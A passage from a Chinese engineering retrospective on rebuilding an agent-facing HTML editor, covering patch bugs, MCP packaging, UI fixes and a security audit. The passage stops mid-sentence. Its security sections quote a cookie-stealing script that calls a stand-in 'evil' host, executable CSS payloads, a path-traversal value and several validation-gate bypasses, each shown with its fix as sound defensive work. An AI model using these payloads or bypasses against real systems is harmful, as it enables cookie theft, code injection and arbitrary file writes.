---
title: "v2：Agent 平台解耦与交互重构 —— 一次把\"看起来能用\"变成\"真的能用\"的复盘"
date: 2026-07-27
tags:
  - agentic-html
  - 开源项目
description: "本文承接 blog/html-editor-plugin.md（v1 从零到一），对应 RFC"
---
> 本文承接 `blog/html-editor-plugin.md`（v1 从零到一），对应 RFC
> `rfcs/v2-agent-decoupling-and-ux.md`。面向后续维护者：**先读第 2 节**，那里记录的是
> 「326 个绿色测试为什么没能发现产品核心链路是断的」。

---

## 1. 需求背景

v1 交付时的账面数据很好看：326 个通过的单元/集成测试、完整的 token 设计系统、一个 VitePress
文档站、9 个 MCP 工具 + 9 个对等 CLI 命令。

但这些测试覆盖的是**零件**。没有一条测试覆盖过完整闭环：

```
人在页面上标注 → 提交 → 服务端持久化 → Agent 读到 → 改 HTML → 落新版本
```

触发本次重构的是一份外部参考 RFC 集（钉钉文档团队）——它把本项目列为前置参考，并列出 5 个
必须修复的缺陷。我们逐条去代码里验证，结果 5 条全部真实存在，另外还发现 2 个更严重的。

**第一个可复用的教训在这里就出现了**：当外部有人打算复用你的项目时，他们读代码的角度和你写
代码的角度不同，会问"这条链路真的通吗"，而不是"这个函数对吗"。这类审视值得主动去找。

---

## 2. 诊断：7 个缺陷，全部有实测证据

我们的原则是**不靠读代码猜，全部跑出来**。下面每条都附当时的实测输出。

### 2.1 P0：补丁静默改错节点（数据损坏）

`patch.service.ts` 当时在**变更循环内部**解析选择器：

```ts
for (const patch of patches) {
  const matched = $(patch.selector);   // ← 上一个 patch 已经改过树了
  // ...
}
```

用与生产完全相同的 cheerio 版本实测：

```
输入： <div class="a">A</div><div class="b">B</div><div class="c">C</div>
patch 1  delete   body > div:nth-child(1)  → 命中 <div class="a">A</div>   ✅
patch 2  replace  body > div:nth-child(2)  → 命中 <div class="c">C</div>   ❌ 应为 B
结果：   <div class="b">B</div><div class="NEW">NEW</div>
返回：   { appliedPatches: 2, failedPatches: [] }
```

第 2 个补丁改错了节点，**而返回值告诉 Agent"全部成功"**。

这是本次重构里最危险的一条：不是崩溃，不是报错，是"静默地把文档改坏并汇报成功"。Agent 会在
这个基础上继续操作，人也不会去核对。对一个自动化工具来说，**错误地宣称成功比失败更贵**。

### 2.2 P0：核心闭环 404，标注从未离开浏览器

`useAnnotationStore.tsx` 提交时只发了一个版本号：

```ts
const res = await fetch('/api/annotations/submit', {
  method: 'POST',
  body: JSON.stringify({ version_id: versionId }),   // ← 标注内容根本没带上
});
```

而 `preview.service.ts` 只注册了 4 条路由（`/preview`、`/api/snapshot/:versionId`、
`/api/annotations/batch`、`/api/annotations/batch/submit`）。**`/api/annotations/submit`
不存在，返回 404。** `App.tsx` 里的 `/api/errors/feedback` 同样不存在。

后果：标注只活在 React state 里，从不落盘，`get_annotations` 永远返回空。**产品的核心价值在
demo 模式之外完全不工作。**

两处细节值得记住：

- 请求体里连标注都没有。也就是说即使端点存在，也传不过去。这说明前后端**从未真正对接过一次**。
- 前端的 `catch` 把 404 吞掉了，UI 上"提交"看起来是成功的。

### 2.3 P0：npm 包不可用，"跨 Agent 兼容"是空头承诺

```
$ npm pack --dry-run
package size: 4.7 MB
total files: 185
```

4.7MB 里的内容是 website 截图和 eval-runs 轨迹，**零行构建产物**。`package.json` 没有 `bin`、
没有 `exports`、没有 `main`、没有 `files`。

更严重的是 MCP 侧：`src/gateway/mcp/` 里既没有 `Server`，也没有 `StdioServerTransport`，
没有任何 `inputSchema`——**没有 `tools/list`，任何 MCP 客户端都无法发现或调用任何工具**。
而 README 记录了一个 `html-editor` CLI 和一个 `dist/gateway/mcp/index.js` 入口，**两者都不
存在**。

README 上那句 "Works with Claude Code, Codex CLI, Cursor, and any MCP client" 在当时是假的。

### 2.4 P1：Overlay 滚动漂移（实测 400px vs 0px）

`useElementCapture.ts` 用 iframe **内部**的 `getBoundingClientRect()` 取坐标，
`AnchorMarker` 把它当**宿主** overlay 坐标用。两个坐标系。

而 `grep -n scroll` 在 `Overlay` / `InkCanvas` / `AnchorMarker` / `useElementCapture` 中
**零命中**——没有任何 scroll / resize 补偿。

实测：iframe 滚动 400px 后，元素移动了 400px，标记移动了 **0px**。所有标记全部漂移。

### 2.5 P1：两套选择器方言，零一致性测试

客户端 `selectorGenerator.ts` 生成 `:nth-child`（浏览器语义），服务端用 cheerio/parse5 解析。
两边在三处系统性分歧：

- 文本节点与注释节点的计数（`:nth-child` 受影响，`:nth-of-type` 不受影响）
- parse5 对畸形 HTML 的自动纠正（未闭合 `<p>`、`<p>` 里的 `<div>`、缺 `<tbody>` 的表格）
- CSS 转义序列的解析差异

**而且没有任何双向一致性测试。**

### 2.6 P1：UI 遮挡（实测坐标）

- `.shortcut-hints` 固定条占 y=873–900，侧栏 footer 占 y=812–900 → **提交按钮被压在快捷键条
  下面，在 1440×900 下根本点不到**。
- 工具栏和侧栏各有一个 "Submit Annotations"，绑同一个 action，互相竞争。
- `@media (max-width:900px)` 直接 `display:none` 掉整个侧栏——窄窗口下所有控件消失，无替代方案。

### 2.7 P1：人看不见 Agent 在做什么

侧栏只有标注列表。人点了提交之后，没有任何反馈：看不到 Agent 的工具调用、补丁提案、成功/失败。
这是当时交互上最大的体验缺口，也是后来发现**最容易修**的一个——因为解耦架构天然提供了它。

### 2.8 P2：测试与工程化

- E2E 只有 2 个文件，断言包在 `if (nodeCount > 0)` 里——**元素不存在时测试静默通过，假绿**。
- 没有 `.claude/skills/`，根目录 `SKILL.md` 不可被发现。
- 工具清单/CLI 清单是手写 Markdown，必然与代码漂移（README 记录不存在的命令就是证据）。

### 2.9 隐藏的第 7 个：跨进程持久化根本没接通

这一条不在参考 RFC 里，是我们自己在写 `*.fs.test.ts` 时才发现的。

`VersionService.create()` 一直老老实实写三个文件：`snapshot.html`、`meta.json`、
`annotations.json`。**但没有任何代码读它们。** 版本只活在 `static sharedVersions: Map` 里。

后果：浏览器和 Agent 几乎从不是同一个进程（人在一个进程服务的预览里标注，Claude Code 在另一个
进程里动手）。**一个进程发出的 `version_id`，在下一个进程里必定 `VERSION_NOT_FOUND`。**
CLI 传输面根本做不了闭环的后半段。

**为什么 326 个测试没发现**：`tests/setup.ts` 里有一行全局 `vi.mock('fs/promises')`。
一个"写了三个文件、从来不读回来"的服务，在这个 mock 下行为完全正常。**测试替身不只是加速工具，
它还会静默地把一整类断言变成不可能。** 这个教训后来直接变成了 `vitest.workspace.ts` 的两个项目。

---

## 3. 方案与关键设计决策

### 决策 1：单一命令注册表，而不是"再补一个 MCP server"

**背景**：最省事的修法是给现有的 `src/gateway/mcp/` 补上 `Server` + schema。

**备选方案对比**：

| 方案 | 工作量 | 留下什么 |
|------|--------|----------|
| A. 补一个 MCP server | ~0.5 天 | CLI 和 MCP 仍是同 9 个操作的**两份手写实现**，已经在漂移；文档是第三份手写副本 |
| B. 单一类型化注册表 + 三个薄投影 | ~1 天 | 新增能力同时点亮三个传输面和生成文档，参数校验只写一次 |

**结论：选 B。** 参考了 [vercel-labs/agent-browser](https://github.com/vercel-labs/agent-browser)
已验证的模式——**能力只实现一次，所有 Agent 接入面都是同一个注册表的薄投影**。

`src/registry/commands.ts` 里一条 `CommandDef` 声明了 `name` / `cli` / `title` /
`description` / `profile` / `readOnly` / `params` / `handler`，然后：

```
                       registry/commands.ts
                                │
      ┌──────────────┬──────────┴──────────┬──────────────────┐
      ▼              ▼                     ▼                  ▼
transport/mcp   transport/http       transport/cli    scripts/update-docs
tools/list      GET /v1/tools        --help / --json  docs/reference/*
inputSchema     POST /v1/tools/:n    flag/positional  README 生成块
readOnlyHint    /v1/tools/openai     exit code
```

**核心收益不是省代码，是"投影不会漂移"。** 两份手写实现有三种失效方式：它们会互相漂移；文档会
和两者都漂移；每加一个能力成本翻三倍。v1 全部中招了。

配套一起落地：

- 工具名 `agentic_html_*` 前缀防冲突；**工具 profile**（`core` / `annotation` / `version` /
  `patch`）避免把 15 个工具全塞进每个 Agent 的上下文（默认只公开 11 个）。
- `readOnlyHint` 注解，客户端可以对只读工具跳过审批。
- `agentic-html skills get` —— 由二进制提供**与版本严格匹配**的 skill 内容。
- `agentic-html doctor --json` —— Agent 可自检环境，每项检查带 `remedy`。
- `.claude-plugin/marketplace.json` —— 可作为 Claude Code 插件分发。
- `package.json` 补 `bin` / `exports` / `files` 白名单。

打包结果：**4.7MB / 185 文件 → 247.7 kB / 121 文件，且含全部构建产物**。（RFC 里写的目标是
< 200KB，实际没达到——`dist` 里的 sourcemap 和 UI 资产是主要体积，为了可调试性保留了。这里
如实记录，不粉饰。）

### 决策 2：`execute()` 是唯一调用路径

三个传输面都不自己校验参数、不自己造错误结构。全部走 `registry/index.ts` 的 `execute()`：

```
execute(name, params, ctx)
  → findCommand
  → validateParams          （唯一的校验实现）
  → bus.emit(tool_call)
  → command.handler(...)
  → bus.emit(tool_result)
  → normalizeError          （唯一的错误归一化）
  → { ok, data } | { ok: false, error }
```

于是同一个错误输入在三个面上产生**同一段文字**，只是外壳不同（MCP `isError` / HTTP 状态码 /
CLI 退出码）。这个性质是免费的，但只有在"唯一路径"成立时才免费。

### 决策 3：控制脚本进 iframe，而不是给 overlay 加 scroll 监听

**背景**：2.4 的漂移问题。

**备选方案对比**：

| 方案 | 工作量 | 留下什么 |
|------|--------|----------|
| A. 保留宿主 overlay，加 scroll/resize 监听 | ~1 天 | 缩放、sticky 定位、嵌套滚动容器仍然错；补偿逻辑永久是自己的负债 |
| B. 所有 DOM 交互注入预览文档内部 | ~1 天 | 坐标系统一，**这一类 bug 从根上消失** |

**结论：选 B。** 判断依据是一个反复出现的经验：**能消灭一整类 bug 的改动，优先于修一个 bug**。
A 方案的补偿逻辑会永远追着新的定位场景跑；B 方案之后"漂移"这个词在这个项目里不再有意义。

实测验证（`tests/e2e/control-script.spec.ts`）：

```
[scroll-drift] element moved -400.00px, marker moved -400.00px, drift 0.00px
```

对比重构前的 marker moved 0px。

**这个决策带来一条必须写死的不变量**：控制脚本的 UI 挂在 `documentElement` 上的**闭合
shadow root**（`[data-ah-ctl]`），是 `<body>` 的兄弟节点，绝不进内容树。理由有四条，每条都
是实际后果：

1. 选择器方言按元素子节点计数。标记 `<div>` 一进 `<body>`，它后面所有 `:nth-of-type()` 索引
   偏移，页面里生成的选择器在服务端解析到另一个节点。
2. `elementsFromPoint` 返回整个栈。覆盖在内容上的标记会变成 ink 圈选的命中目标。
3. `get_region` / `get_document_outline` 读 `<body>`。控制层一进 body，Agent 会把编辑器家具
   当成页面内容。
4. 闭合而非开放：页面脚本无法伸手改控制层。代价是 e2e 也无法用普通 locator，得走
   `__agenticHtmlControl` 句柄——这个代价是值得的，也在测试注释里写清楚了。

桥设计的三条红线：

- **零高频消息过桥**。指针采样、hover、标记跟随全部在 iframe 内 rAF 本地化，只有离散语义事件
  过桥。
- **状态下推用 `setAnnotations` 幂等全量替换**，替代 add/remove/clear 三件套——一次性消掉一
  整族增量同步 bug。
- **草稿文本不进沙箱**。未提交的意图留在宿主的 `SelectionComposer` 里，不写进 Agent 会读、
  补丁会碰的文档。

### 决策 4：补丁两阶段化 —— 先对冻结文档解析，再变更

修 2.1 的方式不是"给循环加个索引偏移修正"，而是把顺序拆开：

```
Phase 1  对冻结文档解析全部选择器，缓存**节点引用**
Phase 2  用缓存的引用变更
```

**关键洞察：节点引用标识的是节点，位置表达式标识的是位置。** 树一变，位置就不再指向原来的
节点；引用永远指向同一个节点。所以修正的不是"计算偏移"，而是"根本不要用位置"。

副产品是两个更好的语义：

- 一次调用里的补丁**不可能互相移位**，Agent 不需要排序、不需要推理前面的补丁做了什么。批量
  提交因此既正确又更省（一次门禁、一个版本）。
- 真的冲突（一个补丁删了另一个补丁目标的祖先）会被**显式报告**为
  `PATCH_APPLY_ERROR`（"the patches overlap"），而不是静默跳过。判定方式是从缓存节点往上走，
  走到一个 `type === 'tag'` 的根说明它已被摘链。

### 决策 5：结构门禁必须是服务端强制的

**与参考 RFC 的关键差异**：他们的 Agent 在自己后端里，可以做 ReAct 自检；**我们的 Agent 在
外部进程（Claude Code / Cursor / 自研 harness），不能依赖它自觉。**

所以门禁放在服务端、在入口、不可绕过。6 项确定性检查（无 LLM）：

| 检查 | 拒绝什么 |
|------|----------|
| `PARSE_OK` | 结果根本装载不了。短路后续检查 |
| `TAG_BALANCED` | **Agent 提供的 fragment** 标签不平衡 |
| `NO_DANGEROUS_NODE` | 新引入的可执行内容 |
| `NO_OUT_OF_BOUNDS` | patch 目标之外的内容发生变化 |
| `HAS_CHANGE` | 空操作补丁集 |
| `SELECTOR_UNIQUE` | 被触碰的选择器不再唯一（`delete` / `replace` 目标豁免） |

**门禁不通过 → 不落版本 → 返回结构化报告让 Agent 自修。** 这条比"返回一个错误"重要：如果
落了版本再报错，Agent 和人都得先判断"到底改没改"。

`TAG_BALANCED` 的实现细节值得单独记：它用一个**手写的标签栈扫描器**看 Agent 写的原始 fragment，
**不用 parser**。因为 parse5 会静默纠正 `<div><p>x</div>`——"它解析通过了"和"它做了你想做的事"
是两个不同的判断。

### 决策 6：视觉验证改为 opt-in

v1 每次 `apply_patch` 都跑像素对比：约 4 秒，并且**泄漏一个浏览器进程**，让 Node 事件循环
永不结束——**CLI 永远不退出**。

改为 `verify: true` 显式开启，且默认 `autoDispose: true`（跑完关浏览器）。长驻服务器可以关掉
autoDispose 自己管理生命周期。

**教训**：一个默认开启的昂贵检查，如果它同时还泄漏资源，会以"工具卡住"的形式出现，而没人会
把"卡住"和"验证功能"联系起来。**默认值要按"每次调用都付这个代价值不值"来选。**

### 决策 7：活动事件总线 —— 解耦架构的直接红利

修 2.7 几乎不需要新架构，因为解耦已经把条件准备好了：三个传输面都走 `execute()`，那么
`execute()` 向一条总线发事件，人就能看到全部。

```
apply_patch over MCP ─┐
apply_patch over HTTP ─┼─▶ execute() ─▶ ActivityBus ─┬─▶ WebSocket ─▶ Activity 分页
apply_patch over CLI  ─┘                             └─▶ SSE /v1/activity/stream
人提交（UI）──────────────────────────────────────▶┘
```

两个设计点：

- 事件带**单调 `seq`**，断线重连用 `Last-Event-ID` / `?after_seq=` 回放，而不是丢历史。
- 缓冲**有界**（500 条）。总线是实时可观测通道，不是持久日志；版本和标注才是持久记录。
  把这条写进注释很重要，否则下一个人会想往里塞审计需求。

---

## 4. 对抗性测试抓到的 7 个 bug

实现完成、测试全绿之后，我们专门做了一轮**对抗性测试**：不问"它能工作吗"，而问"**我怎么骗过
它**"。这一轮抓到 7 个 bug，其中 3 个是安全洞。这一节是本文最值得读的部分。

### 4.1 改写已有 `<script>` 的内容能通过门禁（安全洞）

`NO_DANGEROUS_NODE` 当时靠**计数**判断：新旧文档各数一遍 `<script>` / `<iframe>` 等，变多才
报警。

攻击：不新增 script，**改写一个已存在的 script 的 body**。元素计数完全不变，注入了全新的可
执行代码。

```
patch: { selector: 'script:nth-of-type(1)', action: 'replace',
         content: '<script>fetch("//evil/"+document.cookie)</script>' }
门禁：  ✅ 通过（script 数量 1 → 1）
```

修法是比较**可执行文本本身**而不是载体数量：

```ts
const beforeCode = executableBodies($old);   // 所有 <script>/<style> 的 text
const afterCode = executableBodies($new);
for (const body of afterCode) {
  if (!beforeCode.has(body)) { problems.push('a <script> or <style> body was added or rewritten'); break; }
}
```

**同一个 bug 还有第二层**：`NO_OUT_OF_BOUNDS` 的越界扫描当时用 `node.type === 'tag'` 判断
元素。而 domhandler 给 `<script>` / `<style>` 的 `type` 是 `'script'` / `'style'`——**这两类
节点对越界检查完全不可见**。也就是说即使不通过 replace，改动 script 也不会被越界检查看到。

修法是一个共用的守卫：

```ts
function isElementNode(node: unknown): node is DomElement {
  const type = (node as DomElement | null)?.type;
  return type === 'tag' || type === 'script' || type === 'style';
}
```

**这个 `type === 'tag'` 陷阱在本项目里造成了两处独立故障**：门禁的安全洞，以及选择器方言里
cheerio 适配器和 DOM 适配器看到不同的树（`querySelectorAll('*')` 包含 script，
`children.filter(type==='tag')` 不包含）——后者会让**第一个 script 之后的所有路径索引偏移**。
所以 `selector.ts` 的 `PATH_STOP_TAGS` 里刻意**不**排除 `script` / `style`，只留 `html` /
`head`。

> 可复用经验：**当同一个类型判断在两个地方独立地咬了你，说明它应该是一个共用函数，而且值得
> 在注释里写清为什么。** 这两处的注释都写了，为的是不让第三次发生。

### 4.2 `modify_style` 绕过危险内容扫描（安全洞）

原始实现对 `modify_style` 做了**一刀切豁免**——理由听起来很合理："它带的是 CSS 声明，不是
markup，扫 markup 模式没意义"。

但 CSS 是可以执行代码的：

```
content: "background: url(javascript:alert(1))"        → 豁免，通过
content: "width: expression(alert(1))"                 → 豁免，通过（legacy IE）
```

修法不是取消豁免，而是给它**自己的扫描规则**：

```ts
if (patch.action === 'modify_style') {
  if (/javascript\s*:/i.test(patch.content) || /expression\s*\(/i.test(patch.content)) {
    problems.push('modify_style content contains executable CSS');
  }
  continue;
}
```

> 可复用经验：**"这个分支不适用那条检查"和"这个分支不需要检查"是两句不同的话。** 前者的正确
> 做法是给它写一条适用的检查；直接 `continue` 是把前者偷偷写成了后者。代码里现在有一条注释
> 明确区分这两件事。

### 4.3 `<a href=/>` 被误判为自闭合标签（误杀合法编辑）

`isSelfClosing` 原本只看 attribute 文本是否以 `/` 结尾。于是：

```
<a href=/>link</a>
```

HTML tokenizer 把这个 `/` 当作**未加引号的属性值**的一部分，标签仍然需要 `</a>`。但检查认为
它是自闭合的，于是把后面真实的 `</a>` 当成"多余的闭合标签"，`TAG_BALANCED` 报错——**完全合法
的补丁被拒绝**。

修法是只在 `/` 独立成 token 时才算自闭合：

```ts
export function isSelfClosing(attrs: string): boolean {
  return /(^|\s)\/$/.test(attrs.trimEnd());   // 前面必须是空白或什么都没有
}
```

> 可复用经验：**门禁的误杀（false positive）和漏杀（false negative）都要专门找。** 漏杀是
> 安全问题，误杀是可用性问题——一个会误杀的门禁，最终会被人加 flag 关掉，然后漏杀问题一起
> 回来。测试里现在有三条：不误判未加引号的斜杠、仍识别真正的自闭合、仍能抓到带未加引号属性的
> 真正未闭合标签。

### 4.4 `recent(0)` 返回整个缓冲区

```ts
recent(limit = 50) {
  return this.buffer.slice(-limit);     // limit = 0 → slice(-0) → slice(0) → 全部
}
```

因为 JS 里 `-0 === 0`，`slice(-0)` 等价于 `slice(0)`，**返回整个数组**。"给我最近 0 条"
返回了 500 条。

在 `get_activity(limit: 0)` 这条路径上，这意味着一个想要"什么都不要"的调用拿到了整个缓冲区
灌进 Agent 上下文。

```ts
recent(limit = 50): ActivityEvent[] {
  if (limit <= 0) return [];
  return this.buffer.slice(-limit);
}
```

> 可复用经验：**所有取"最后 N 个"的 `slice(-n)` 都要单独测 `n = 0`。** 这个坑不是本项目独有
> 的，它是 `slice` 的负零语义，在任何分页/截断代码里都会出现。边界值测试要包含 0，不只是 1 和
> 最大值。

### 4.5 CLI 位置参数被静默丢弃

`parseArgs` 原本按**槽位下标**绑定位置参数。于是：

```bash
agentic-html region --version-id ver-001 h1
```

槽位 0（`version_id`）已被 flag 填了，`h1` 按下标进槽位 0 → 被丢弃 → 命令报
`Missing required parameter: selector`。**用户明明提供了 selector。**

修法是只往**还空着的槽位**里填：

```ts
const openSlots = positionals.filter((param) => params[param.name] === undefined);
positionalValues.forEach((value, i) => {
  const param = openSlots[i];
  if (!param) throw new CliParseError(`Unexpected argument '${value}': …`);
  params[param.name] = coerce(param, value, param.name);
});
```

> 可复用经验：**混用 flag 与位置参数时，"位置"指的是剩余槽位的位置，不是声明顺序的下标。**
> 另外注意这个 bug 的表现形式：报错信息说缺少一个用户已经给了的参数。**当错误信息与用户的
> 实际输入矛盾时，几乎总是解析层的问题，不是用户的问题。**

### 4.6 活动总线的"精神分裂"

`createServices()` 原本这样写：

```ts
export function createServices(): CommandContext['services'] {
  const version = new VersionService();
  return { version, preview: new PreviewService(version), /* ... */ };
}
```

`PreviewService` 没拿到 bus，于是它 fallback 到**全进程默认总线** `activityBus`。而注册表命令
向调用方注入的那条 bus 发事件。

结果：一个测试或一个嵌入方自带 bus 时，**人提交标注、HTML 报错这些 UI 事件落在一条总线上，
工具调用落在另一条上**——两条总线各看到半个故事，而且没有任何报错。

```ts
export function createServices(bus: ActivityBus = activityBus): CommandContext['services'] {
  const version = new VersionService();
  return { version, preview: new PreviewService(version, bus), /* ... */ };
}
```

> 可复用经验：**"可注入依赖 + 有默认值"是一个陷阱组合。** 默认值让"忘记注入"不报错，只是
> 静默地退化成另一套行为。凡是有默认单例的依赖，都要检查所有构造点是否真的把注入的那个传下去
> 了。`createContext()` 现在也显式地把同一条 bus 传给 `createServices()`，注释里写明了原因。

### 4.7 HTTP 传输面的 `Access-Control-Allow-Origin: *`（安全洞）

`agentic-html serve` 最初无条件发 `Access-Control-Allow-Origin: *`，注释写的是"本地工具
服务器，允许浏览器里的 Agent 调用它"。听起来无害。

但 `preview_html` 和 `get_dom_snapshot` **读本地文件并返回内容**。于是：只要这个服务器在跑，
用户碰巧访问的**任何**网页都可以跨域调它，把用户磁盘上的任意 HTML 读走。

修法是把 CORS 收紧到 loopback 源，并且把额外来源变成显式配置项：

```ts
const allowed = new Set(options.allowedOrigins ?? []);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (typeof origin === 'string' && (isLoopbackOrigin(origin) || allowed.has(origin))) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');
    // ...
  }
  next();
});
```

`isLoopbackOrigin` 需要小心几处：端口任意、`https` 也算、`[::1]` 与 `::1` 两种写法、
`*.localhost` 合法——但**不能**用 `includes('localhost')`，否则
`http://localhost.evil.com` 会通过。`tests/unit/transport/cors.test.ts` 里专门有一条
"rejects a hostname that merely contains localhost"。

预检也要一并想清楚：被拒来源的 preflight 上面那段不会写任何 CORS 头，浏览器因此拦掉真实请求；
`OPTIONS` 仍然回 204 只是为了形状统一，不授予任何权限。同时注意 CORS 是**浏览器机制**，
curl / Node / 后端的服务器间调用完全不受影响——这也正说明它不是"访问控制"，只是"别让浏览器
替第三方页面发请求"。

> 可复用经验：**判断 CORS 该多宽，要看这个 API 能读到什么，而不是看它是不是"本地工具"。**
> "反正只跑在 localhost" 是错的推理方向——localhost 服务器恰恰是浏览器里任意页面都能访问到
> 的目标。另外，任何"域名白名单"判断都不要用子串匹配，一律解析成 URL 后比对 hostname。

### 番外：两个抛出点抛同一个错误码

`patch.service.ts` 里 `PATCH_ALL_FAILED` 曾有两个抛出点：一个带 `failed_patches` 且
`recoverable: true`，另一个（更窄的前置条件）不带上下文且 `recoverable: false`。**取决于哪个
条件先成立，Agent 或者能看到失败原因，或者看不到。**

现在只有一个抛出点。

> 可复用经验：**同一个错误码只应该有一个抛出点。** 多个抛出点意味着同一个码有多种上下文完整
> 度，调用方无法写出可靠的处理逻辑。

---

## 4B. 一轮专门的对抗性安全审计

CORS 那条（4.7）暴露之后，我们对新增的攻击面做了一轮**独立的安全审计**——把 Agent、被预览的
HTML、以及用户碰巧访问的网页都当作不可信输入。它又抓到一批问题，按威胁模型排序，全部已修并有回归
测试（`tests/integration/security.fs.test.ts`）。这里只记最有教育意义的几条。

### F1（CRITICAL）：`version_id` 路径穿越导致任意文件写

读路径 `loadFromDisk` / `readAnnotations` 有字符白名单守卫，但**写路径 `persistAnnotations`
没有**。而 `POST /api/annotations/submit`（无鉴权）会 `mkdir -p` + 写文件到
`getVersionDir(versionId)`。实测：`version_id: "../../../../tmp/pwn"` 在 `/tmp` 下写出了文件。

修法的关键不是"再加一个白名单"，而是把守卫下沉到 `getVersionDir` 一处，且用**路径包含判断**而不是
字符判断：`path.resolve(root, id)` 之后必须仍在 `root + sep` 之内。字符白名单 `[A-Za-z0-9._-]+`
仍然放过 `.` 和 `..`——它们是合法文件名，也确实能读上一级目录（F12）。

> 可复用经验：**路径安全用"解析后是否被根目录包含"判断，不要用字符黑/白名单。** 并且守卫要放在
> 构造路径的唯一函数里，让每个调用点自动继承——F1 的根因就是读路径守了、写路径漏了。

### F2（HIGH）：门禁的一批绕过——危险不只在"带脚本的元素"

六项检查全绿却提交了可执行内容的路径，全部实测：`<base href=远程>`（重定向所有既有相对脚本）、
`<meta http-equiv=refresh>`、`<link rel=stylesheet href=远程>`、以及实体编码的
`java&#10;script:`（parse5 解码 `&#10;` 成换行，浏览器在解析 scheme 前会剥掉 TAB/LF/CR）。
两个根因：`checkOutOfBounds` 只扫 `body *`，**整个 `<head>` 不设防**；URL scheme 检测只容忍
冒号*周围*的空白，不容忍 scheme *内部*被换行/实体拆开。

修法：`DANGEROUS_TAGS` 增加 `base/meta/link`（但只算它们的**危险变体**——`<meta name>`、
`<link rel=icon>` 无害，否则会误杀普通的 head 编辑）；URL 先 `canonicalizeUrl` 剥空白再判 scheme；
门禁扫描范围扩到 `head *`。

> 可复用经验：**危险内容检测要在"浏览器实际看到的规范形态"上做，而不是在原始字符串上做。** 实体
> 编码、控制字符、大小写、scheme 内空白——攻击者会用尽解析器和你的正则之间的每一处分歧。

### F3（HIGH）：`create_version` 完全不过门禁

"没有版本能绕过门禁"的不变量只在 `apply_patch` 成立；`create_version` 直接 `version.create`。
于是想注入 `<script>` 的 Agent 根本不需要 F2 的花招，提交整篇 HTML 即可。修法是让
`create_version` 也跑门禁（跳过与补丁目标相关的区域检查，保留内容检查）。

> 可复用经验：**一个安全不变量，要在通往它的每条路径上都成立，而不是只在主路径上。**

### F4（HIGH）：没有 `Host` 校验 → DNS rebinding 把整个工具面交给网页

CORS 收紧后仍有 F4：攻击者域名一旦解析到 `127.0.0.1`，其页面对本服务器的请求就是同源的，**根本
不需要 CORS 授权**。能改的只有 `Host` 头——所以要求 `Host` 是 loopback 才是真正堵住 rebinding
的那道闸。CORS 值得保留，但它不是这道防线。同理 WebSocket 握手不受 CORS 约束（F6），需要单独
`verifyClient` 校验 Origin/Host；预览服务器也从"绑定所有网卡"改成绑定 `127.0.0.1`。

> 可复用经验：**CORS 不是访问控制。** 对 loopback 服务，`Host` 校验 + 绑定回环 + WS 的
> `verifyClient` 才是防 rebinding 的组合拳。

### 其余

F7 冗余裁剪只截顶层字符串，补丁体（`patches[].content`）在数组里原样留存并被广播——改为递归裁剪。
F8 `checkOutOfBounds` 是 O(n²)，8000 元素单这一项要 22s——改为先建一次指纹索引，降到 65ms。
F10 parse5 会**静默搬运**违反内容模型的片段（`<tr>` 里的 `<div>` 被 foster-parent 出表格），
提交的字节与门禁校验过的树不一致——用 htmlparser2（不搬运）对比 parse5（搬运）的父节点映射来检测，
并排除 void 元素与 scaffold 以避免误报。F11 MCP `tools/call` 之前不认 `--tools` profile，收窄
profile 只是少列了工具却没真正禁用——现在 `tools/call` 也按 profile 校验。F13 skill 名来自 argv，
`join(dir, name)` 可穿越——加名字校验。

> 这一轮最大的元教训：**让审计的人（或 Agent）去断言"这个漏洞还在不在"，而不是断言"功能对不对"。**
> 用"如果现在触发这个攻击，我的检查会不会报警？"来写测试，比用"正常输入下结果对不对"能多抓一个
> 数量级的问题。

---

## 5. 交互重构

### 5.1 从"一个列表"到"三个分页"

侧栏改为 `Annotations | Activity | Versions`。**Activity 是这次重构的主要 UX 收益**：人提交
之后不再是黑盒，能看到每一次工具调用、每一个新版本、每一次门禁拒绝，并且带 transport 标签
（`MCP` / `HTTP` / `CLI` / `You` / `System`）。门禁失败和锚点失败会**展开**显示每一项检查
——因为那正是人需要介入的时刻。

### 5.2 遮挡与重复控件

- 快捷键固定条 → `?` 弹层（带焦点管理与焦点陷阱，关闭后归还焦点）。
- 两个 "Submit Annotations" → **一个**，放在它作用的那个列表旁边（工具栏那个删掉）。
- `< 900px` 的 `display:none` → **底部 sheet**。
- 侧栏可拖拽调宽（持久化到 localStorage）、可折叠；resize handle 支持键盘。
- tablist 用真实 ARIA 角色 + 左右方向键导航。

E2E 直接断言这些：`tests/e2e/layout.spec.ts` 在 1440×900 与 1280×720 两个尺寸下，取提交按钮
中心点做 `elementFromPoint`，**要求命中的就是按钮本身**——而不只是"按钮可见"。

> 可复用经验：**"元素可见"和"元素可点"是两个断言。** 被覆盖的按钮在 Playwright 的
> `toBeVisible()` 下是通过的。测遮挡必须用命中测试。

### 5.3 Region / Element 而不是 Ink / Select

命名跟着用户意图走：人想的是"这块区域"和"这个元素"，不是"墨迹"和"选择"。同时也去掉了 v1 文档
里"add element to chat"这个借来的说法——它描述的是 VSCode 的交互，不是我们的。

---

## 6. 测试架构：两个 vitest 项目

2.9 的教训直接变成了 `vitest.workspace.ts`：

| 项目 | 匹配 | 特点 |
|------|------|------|
| `unit` | `tests/**/*.test.ts`（排除 `e2e/`、`*.fs.test.ts`） | 全局 `vi.mock('fs/promises')`，快且无副作用 |
| `fs` | `tests/**/*.fs.test.ts` | 真实文件系统；`fileParallelism: false`（用例 chdir 到临时目录） |

`tests/integration/cross-process.fs.test.ts` 通过**清空静态 Map** 来模拟第二个进程——那正是
冷启动进程的状态——然后去要只存在于磁盘上的数据。

**这个划分本身就是文档。** `vitest.workspace.ts` 的头注释写清了为什么存在两个项目，所以下一个
人在写落盘相关测试时会知道该放哪。

关于跨进程的**现状要如实记录**：`get()` 与标注读取有磁盘回退、`history()` 无条件
`loadAll()`，所以 `outline` / `region` / `snapshot` / `annotations list|export` /
`versions list` / `patch preview` / `patch apply` 跨进程可用。但
`compare_versions` / `checkout_version` / `create_version` 的 `parent_id` 持有的是内存
活引用，仍只认当前进程已加载的版本树。**这是已知的不完整，不是已解决**，文档里写的是这个边界
而不是"跨进程已支持"。

`history()` 那个 `loadAll()` 的写法本身是一个独立的坑：它必须**无条件**调用。第一版写的是
`if (this.versions.size === 0) await this.loadAll()`，看起来是个合理的短路——但
`PatchService` 的构造函数总会 `registerDefaultVersion('ver-001', ...)`，所以 map **永远
